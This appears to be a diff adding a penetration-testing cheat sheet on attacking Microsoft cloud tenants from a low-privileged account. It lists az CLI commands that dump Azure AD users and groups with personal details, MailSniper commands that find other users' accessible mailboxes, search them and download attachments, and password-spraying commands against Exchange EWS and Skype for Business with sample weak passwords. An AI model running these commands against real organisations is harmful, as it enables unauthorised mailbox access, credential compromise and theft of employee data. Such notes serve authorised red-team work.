@@ -1,0 +1,42 @@
+Using low privileged account from external to enumerate AD objects:
+
+- only incase ADFS is configured 
+- EWS is accessible
+
+1. Login into portal.azure.com and access active directory users, groups, web APIs and other subscription information.
+2. Login through Azure client to dump the AD users, groups, Web API details to CSV format.
+
+For All users:
+az ad user list --output=table --query='[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}'
+
+For specific User (Using UPN):
+az ad user list --output=json --query='[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}' --upn='<upn>'
+
+For All groups:
+az ad group list --output=json --query='[].{Group:displayName,Description:description}'
+
+For Specific group member:
+az ad group member list --output=json --query='[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}' --group='<group name>'
+
+
+3. Locate exchange EWS portal. Then use MailSniper to bruteforce Exchange EWS by supplying email list.
+
+Import-Module .\MailSniper.ps1
+
+# -Remote switch will prompt for credentials. Below command will find other user's mailbox which we are accessible via the compromised ones.
+Invoke-OpenInboxFinder -EmailList .\email.txt -ExchHostname outlook.office365.com -Remote
+
+Invoke-SelfSearch -ExchHostname outlook.office365.com -Mailbox <User_Mail_ID_where_we_can_access_mailbox_enumerated_from_the_command_above> -OtherUserMailbox -folder all -CheckAttachments -
+DownloadDir C:\Temp -OutputCsv SensitiveMails.csv -Remote
+
+Invoke-PasswordSprayEWS -ExchHostname Company_o365.com -UserList .\email_id.txt -Password qwerty -Threads 1 -OutFile sprayed-ews-cr
+eds.txt
+
+4. Identify Skype for business URL to bruteforce using Lyncsniper to enumerate user email ids:
+Open the target URL : lyncdiscover.targetURL.org
+
+Invoke-LyncSpray –userlist users.txt –password Welcome1 –AutoDiscoverURL –verbose https://lyncdiscover.targetURL.org
+
+5. Identify publicly accessible VPN portals to get inside the network.
+
+
